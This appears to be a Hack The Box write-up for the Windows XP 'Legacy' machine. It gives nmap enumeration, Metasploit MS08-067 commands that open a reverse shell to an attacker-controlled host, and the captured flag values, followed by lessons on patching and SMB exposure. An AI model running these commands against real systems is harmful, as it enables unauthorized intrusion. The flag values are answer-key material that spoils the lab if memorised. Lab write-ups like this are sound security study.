---
tags:
  - ctf
  - hbwj
platform: htb
os: windows
---
# Legacy - HTB Writeup

## Overview

**OS**: Windows XP SP3

This machine demonstrates the critical vulnerabilities present in legacy Windows XP systems, specifically the MS08-067 (Conficker/Netapi) vulnerability that allows remote code execution through SMB. The attack path is straightforward: identify the vulnerable SMB service, exploit MS08-067 to gain SYSTEM access, and retrieve both flags.

## Enumeration

Initial port scan revealed minimal attack surface:

```bash
nmap -Pn -p 80,8080,443,445,139,21,22,3389 10.10.10.4
```

Results:
- Port 139/tcp - NetBIOS Session Service (open)
- Port 445/tcp - Microsoft-DS/SMB (open)

Service version enumeration:

```bash
nmap -Pn -p 445 --script smb-os-discovery,smb-protocols 10.10.10.4
```

Key findings:
- OS: Windows XP (Windows 2000 LAN Manager)
- Computer name: LEGACY
- SMBv1 enabled (dangerous but default for XP)
- No SMB signing required

Vulnerability scanning confirmed two critical vulnerabilities:

```bash
nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 10.10.10.4
```

Both MS08-067 and MS17-010 were confirmed vulnerable.

## Initial Foothold

Given the Windows XP target with SMB vulnerabilities, MS08-067 was selected as the primary attack vector due to its reliability on XP systems.

### Exploitation via MS08-067

Using Metasploit's ms08_067_netapi module:

```bash
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST 10.10.16.2
set LPORT 4444
exploit
```

The automatic targeting successfully identified the system and delivered a reverse shell with SYSTEM privileges immediately.

## Privilege Escalation

No privilege escalation was required. The MS08-067 exploit provides SYSTEM access directly due to the nature of the vulnerability - it exploits a buffer overflow in the Server service's NetAPI32.dll, which runs with SYSTEM privileges.

Verification of privileges:
```cmd
echo %USERNAME%
LEGACY$
```

The LEGACY$ response confirms SYSTEM access (computer account).

## Flag Retrieval

With SYSTEM access, both flags were immediately accessible:

User flag location:
```cmd
type "C:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
```

Root flag location:
```cmd
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
```

## Lessons Learned

1. **Legacy System Vulnerabilities**: Windows XP systems with SMB exposed are critically vulnerable to well-known exploits like MS08-067 and MS17-010.

2. **Direct SYSTEM Access**: Some vulnerabilities provide immediate SYSTEM access without requiring privilege escalation, particularly those affecting system services.

3. **SMBv1 Risks**: The presence of SMBv1 without signing requirements creates multiple attack vectors.

4. **Patch Management**: This machine demonstrates why organizations must retire legacy systems - Windows XP reached end-of-life in 2014, leaving systems permanently vulnerable.

5. **Service Exposure**: Exposing SMB services (139/445) to untrusted networks is extremely dangerous, especially on unpatched systems.